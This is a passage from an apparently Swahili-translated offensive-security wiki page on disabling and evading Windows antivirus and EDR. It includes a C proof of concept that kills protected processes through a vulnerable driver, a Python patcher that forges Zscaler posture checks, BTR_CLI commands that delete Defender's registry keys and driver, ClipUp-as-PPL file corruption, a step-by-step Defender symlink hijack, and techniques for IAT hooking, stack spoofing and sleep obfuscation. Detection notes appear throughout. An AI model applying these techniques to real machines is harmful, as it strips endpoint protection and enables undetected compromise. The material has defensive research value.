   Mfano mdogo wa uthibitisho wa dhana wa C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua processes *zilizolindwa*, kuzisimamisha, au kuchezea kernel objects bila kujali vipengele vya hardening vya PPL/PP, ELAM au vingine.

Ugunduzi / Upunguzaji wa hatari
•  Washa orodha ya Microsoft ya kuzuia drivers zilizo hatarishi (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa huduma mpya za *kernel* na utoe arifa driver inapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au haipo kwenye allow-list.
•  Chunguza handles za user-mode kwa custom device objects zinazofuatwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kupita Ukaguzi wa Zscaler Client Connector wa Hali ya Kifaa kwa Kubadilisha Binaries Zilizo Kwenye Diski

**Client Connector** ya Zscaler hutekeleza sheria za hali ya kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za usanifu zinawezesha kupita ukaguzi kikamilifu:

1. Tathmini ya hali ya kifaa hufanyika **upande wa client pekee** (boolean hutumwa kwa server).
2. RPC endpoints za ndani hukagua tu kuwa executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kubadilisha binaries nne zilizosainiwa kwenye diski**, mbinu zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyobadilishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara, hivyo kila ukaguzi hupita |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | Hufanywa NOP ⇒ process yoyote (hata isiyosainiwa) inaweza kuunganisha kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa integrity wa tunnel | Hupitishwa moja kwa moja |

Dondoo fupi la patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* Ukaguzi **wote** wa posture huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zimebadilishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyodhibitiwa hupata ufikiaji usio na vizuizi kwa mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu wa kisa unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa mteja pekee na ukaguzi rahisi wa saini vinaweza kushindwa kwa kubadilisha byte chache.

## Matumizi mabaya ya utendaji unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni sehemu halali ya kurekebisha mfumo iliyosainiwa na Microsoft, haina hitilafu ya uharibifu wa kumbukumbu wala kiolesura cha IOCTL; badala yake, baada ya kupata ufikiaji wa msimamizi na `SeLoadDriverPrivilege`, mhusika anaweza kughushi muamala wake binafsi wa kurekebisha mfumo na kupata uwezo uliokusudiwa wa kufanya shughuli za faili/registry katika Ring-0. Hii ni **primitive ya kuzima AV/EDR baada ya mfumo kuathiriwa, si njia ya kupata ufikiaji wa awali wala ya kuongeza mamlaka**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya lengo lenyewe badala ya kuleta driver ya mtu mwingine inayoweza kuonekana wazi.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida, Defender huweka resource hiyo kama faili yenye jina nasibu la `[a-z]{8}.sys` na kusajili huduma ya kernel yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya huduma, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika mrejesho, kisha hurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ipakuliwe badala ya kubaki ikifanya kazi. Huduma iliyoghushiwa huwa na thamani zifuatazo bainifu.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

The stream ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena key isiyobadilika ya baiti 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina header ya kimataifa ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na transaction ID inayotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 inayoishia kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data inayotegemea action, inayoishia kwa **baiti NUL nne haswa**. Kila eneo la header/data hukaguliwa kivyake kwa kutumia CRC-32 polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Action ID zinazokubaliwa huonyesha primitive hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya item | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikijumuisha faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye njia iliyolindwa iliyochaguliwa na mshambulizi; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye waya ni **backslash mbili mfululizo**; njia iliyopangwa kwa muundo wa kawaida haitagawanywa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila item hubadilika kuwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina sehemu ya flags mwanzoni, BTR huhamisha path hadi kwenye baiti nne za akiba za mwisho ili kutengeneza nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mtiririko wa `BTR_CLI` na kipindi cha early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kusarifu/kukokotoa checksum/kusimba actions zilizounganishwa, kuunda key ya registry ya service moja kwa moja, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama driver ya system-start kwa `-trigger boot`. Kuweka staging moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hiyo **hakuzalishi** Event ID 7045 ya usakinishaji wa service. Artifacts zinazoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa kutumia `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya shughuli za I/O za faili kutoka `DriverEntry` kabla stack ya hifadhi na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini viendeshi vingi vya usalama vinavyoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vinavyoanza wakati wa boot kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa binaries au usanidi wa huduma zake kabla ya kuwasha tena, na inaweza kufuta vitekelezo vya huduma kabla SCM haijavizindua. ELAM haizibi mwanya huu kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina saini halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika muamala mmoja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa kwa jina hilo: BTR huunda logi hii, kisha huchukua ombi lake la kufuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka maoni ndani ya `<random>.sys:<random>.dat` kukiruhusu kuondoa driver na streams zote mbili kwa pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Ulinganishaji wa matukio yenye ishara kubwa

Kanuni zinazotegemea saini pekee na orodha ya Microsoft ya madereva hatari yaliyopigwa marufuku hazishughulikii matumizi mabaya ya utendakazi uliokusudiwa wa BTR. Pendelea ulinganishaji huu wa kitabia, huku ukitofautisha mfuatano halali wa Defender na programu yoyote ya uzinduzi.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` hutokea katika kila hatua ya uwekaji wa BTR. ADS ya `.dat` iliyoambatanishwa na `.sys` hiyo hiyo inatia shaka hasa kwa sababu Defender halali kwa kawaida huweka maoni chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** Linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` ulio na `Args=...:changelist` na `Group=Boot Bus Extender` bila tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** Linganisha upakiaji wa driver ya BTR inayojulikana kutoka mfuatano usio wa Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa binaries za usalama.
- **Sysmon 11 -> 23:** Toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwashaji wa `SeLoadDriverPrivilege`; saini ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati driver ya zana ya usalama inapowekwa na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuhujumu AV/EDR kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa ya kiwango sawa au cha juu pekee iweze kuingiliana kwa madhara. Kwa upande wa mashambulizi, ikiwa unaweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti hoja zake, unaweza kubadilisha utendakazi usio na madhara (kwa mfano, logging) kuwa primitive yenye mipaka ya kuandika inayotumia PPL dhidi ya directories zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima iwe imesainiwa kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa kutumia CreateProcess pamoja na flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ni lazima iombwe protection level inayooana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers wa Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Zana saidizi ya open-source: CreateProcessAsPPL (huchagua protection level na kupeleka hoja kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyotiwa sahihi `C:\Windows\System32\ClipUp.exe` hujianzisha yenyewe na hukubali kigezo cha kuandika faili ya logi kwenye njia iliyobainishwa na mpigaji.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zenye nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

Vifaa vya kusaidia njia fupi za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila saraka mama.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mlolongo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN yenye uwezo wa PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya logi ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikihitajika.
3) Ikiwa AV kwa kawaida huwa imefungua/kufunga binary lengwa inapofanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha kabla AV haijaanza kwa kusakinisha huduma ya kujianzisha kiotomatiki ambayo huanza mapema zaidi kwa uhakika. Thibitisha mpangilio wa kuwasha kwa Process Monitor (boot logging).
4) Wakati wa kuwasha upya, uandishi unaolindwa na PPL hufanyika kabla AV haijafunga binary zake, na hivyo kuharibu faili lengwa na kuzuia kuanza kwake.

Mfano wa uendeshaji (njia zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Maelezo na masharti
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, ila mahali yanapoandikwa; primitive hii inafaa kwa kuharibu maudhui badala ya kuyaingiza kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na muda wa kuwasha upya.
- Muda ni muhimu: lengwa halipaswi kuwa limefunguliwa; kutekeleza wakati wa kuwasha huepusha kufungwa kwa faili.

Ugunduzi
- Uundaji wa mchakato wa `ClipUp.exe` wenye argument zisizo za kawaida, hasa ukiwa na launcher isiyo ya kawaida kama mchakato mzazi, karibu na wakati wa kuwasha.
- Services mpya zilizosanidiwa kuwasha binaries zinazotiliwa shaka kiotomatiki na zinazoanza kabla ya Defender/AV mara kwa mara. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuanza kwa Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/direkitori za Platform za Defender; uundaji/urekebishaji wa faili usiotarajiwa unaofanywa na michakato yenye flags za protected-process.
- Telemetry ya ETW/EDR: tafuta michakato iliyoundwa kwa kutumia `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: punguza binaries zilizotiwa saini zinazoweza kuendeshwa kama PPL na michakato mzazi inayoruhusiwa; zuia matumizi ya ClipUp nje ya miktadha halali.
- Usimamizi wa service: zuia uundaji/urekebishaji wa services zinazojiwasha kiotomatiki na fuatilia mabadiliko ya mpangilio wa kuanza.
- Hakikisha ulinzi wa Defender dhidi ya kuchezewa na ulinzi wa early-launch vimewashwa; chunguza hitilafu za kuwasha zinazoashiria kuharibika kwa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa mazingira yako yanaweza kuhimili (fanya majaribio kwa kina).

## Kuchezea Microsoft Defender kupitia Symlink Hijack ya Folda ya Toleo la Platform

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo unaokuja juu zaidi kwa mpangilio wa kileksikografia (kwa mfano, `4.18.25070.5-0`), kisha huanzisha michakato ya service ya Defender kutoka humo (na kusasisha njia za service/registry ipasavyo). Uchaguzi huu huamini maingizo ya saraka, yakiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye njia inayoweza kuandikiwa na mshambuliaji na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika ili kuunda saraka/symlinks ndani ya folda ya Platform)
- Uwezo wa kuwasha upya au kuchochea uteuzi upya wa Defender platform (service huanzishwa upya wakati wa kuwasha)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake, lakini uteuzi wake wa platform huamini maingizo ya saraka na huchagua toleo la juu zaidi kwa mpangilio wa kileksikografia bila kuthibitisha kwamba lengwa linaelekeza kwenye njia iliyolindwa/inayoaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikiwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (kuwasha upya kunapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa huduma/registry ukionyesha eneo hilo.

Chaguo za baada ya exploitation
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika michakato ya Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa kuanza tena, njia iliyosanidiwa isielekezwe kwenye eneo lolote na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa mbinu hii yenyewe haitoi privilege escalation; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Timu za red team zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa kufanya hooking kwenye Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia position-independent code (PIC) inayodhibitiwa na mshambuliaji. Hii inapanua evasion zaidi ya API chache ambazo kits nyingi hutoa (k.m., CreateProcessA), na hutumia ulinzi huohuo kwa BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na target module kwa kutumia reflective loader (iliyotangulizwa au companion). PIC lazima ijitosheleze na iwe position-independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports zinazolengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye PIC wrappers nyepesi.
- Kila PIC wrapper hutekeleza evasion kabla ya kufanya tail-call kwenda kwenye anwani ya API halisi. Evasion za kawaida zinajumuisha:
  - Kuficha/kuonyesha tena memory kabla na baada ya mwito (k.m., kusimba maeneo ya beacon, RWX→RX, kubadilisha majina/ruhusa za kurasa) kisha kurejesha hali baada ya mwito.
  - Call-stack spoofing: tengeneza stack isiyo na madhara na ubadilishe hadi kwenye target API ili uchanganuzi wa call stack utambue frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa uoanifu, toa interface ili Aggressor script (au inayolingana nayo) iweze kusajili API za kufanyiwa hooking kwa Beacon, BOFs na post-ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyofanyiwa hooking, bila kurekebisha code ya tool au kutegemea Beacon kupitisha API mahususi.
- Hushughulikia post-ex DLLs: kufanya hooking ya LoadLibrary* hukuwezesha kunasa upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hizohizo kwenye miito yao ya API.
- Hurejesha matumizi ya kuaminika ya amri za post-ex zinazozindua process dhidi ya detections zinazotegemea call stack kwa kufunika CreateProcessA/W.

Mchoro wa chini kabisa wa IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo sana na salama kwa PIC; tatua API halisi kupitia thamani asili ya IAT uliyonasa kabla ya kuweka patch, au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na uepuke kuacha kurasa zikiwa writable+executable.

Stub ya call-stack spoofing
- PIC stubs za mtindo wa Draugr huunda mlolongo bandia wa miito (return addresses zinazoelekeza kwenye modules zisizo hatari) kisha huingia kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs zinapoita APIs nyeti.
- Oanisha na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianzishwe kiotomatiki wakati DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za stack: return addresses zisizohusiana na images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; mfuatano wa RtlUserThreadStart usiolingana.
- Telemetry ya loader: writes za ndani ya process kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa load.
- Kuepuka image-load: ikiwa hooking LoadLibrary*, fuatilia upakiaji unaotia shaka wa automation/clr assemblies unaohusishwa na matukio ya kuficha memory.

Vipengele vya ujenzi na mifano vinavyohusiana
- Reflective loaders zinazofanya IAT patching wakati wa kupakia (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na PIC ya stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO inayokaa kwenye memory

Ikiwa unadhibiti reflective loader, unaweza kuweka hooks za imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya loader ya `GetProcAddress` na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (PIC object endelevu) inayobaki baada ya loader PIC ya muda kujifuta.
- Export function ya `setup_hooks()` inayobadilisha resolver ya imports ya loader (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka imports za ordinal na utumie utafutaji wa hooks unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili targets za hooks wakati wa link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa kuwa iko ndani ya resident PICO.

Hii huwezesha **import-time IAT redirection** bila kupatch sehemu ya code ya DLL iliyopakiwa baada ya load.

### Kulazimisha imports zinazoweza kuwekewa hooks wakati target inatumia PEB-walking

Import-time hooks hutumika tu ikiwa function imo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa exports kwa hash (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na rejeleo la moja kwa moja kama `&WaitForSingleObject`.
- Compiler huzalisha IAT entry, na hivyo kuwezesha interception wakati reflective loader inatatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kupatch `Sleep()`

Badala ya kupatch `Sleep`, weka hook kwenye **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, zungushia mwito huo kwa mnyororo wa obfuscation wa mtindo wa Ekko unaosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotengenezwa maalum.
- Mnyororo wa kawaida (x64): weka image kwenye `PAGE_READWRITE` → ifanye RC4 encrypt kupitia `advapi32!SystemFunction032` kwa image nzima iliyomapishwa → fanya wait inayozuia → ifanye RC4 decrypt → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa `CONTEXT` ya mfano; nakili kwenye frames nyingi na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee huku image ikiwa imefichwa. Muundo huu huificha module dhidi ya scanners wakati wa idle na huepuka signature ya kawaida ya “patched `Sleep()`”.

Mawazo ya detection (yanayotegemea telemetry)
- Milipuko ya callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` kutumiwa kwenye buffers kubwa, endelevu, zenye ukubwa wa image.
- `VirtualProtect` ya eneo kubwa ikifuatiwa na urejeshaji maalum wa ruhusa kwa kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizo na CFG, jump ya kwanza isiyo ya moja kwa moja kuingia kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha process ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN`, kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kufanya chains za mtindo wa Ekko/Kraken ziendelee kufanya kazi ndani ya processes zilizoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila destination isiyo ya moja kwa moja inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa wote wa image**.
- Kwa maeneo yaliyomapishwa kwa mkono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si tu kwenye dispatch gadget, bali pia kwenye exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sehemu zozote zinazoweza kutekelezwa zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” na kuzifanya primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### CET-safe stack spoofing kwa threads zinazolala

Kubadilisha `CONTEXT` yote kunatia shaka na kunaweza kusababisha matatizo kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyospoofiwa lazima iendane na hardware shadow stack. Muundo salama zaidi wa sleep-masking ni:<sup>[[30]](#references)</sup>

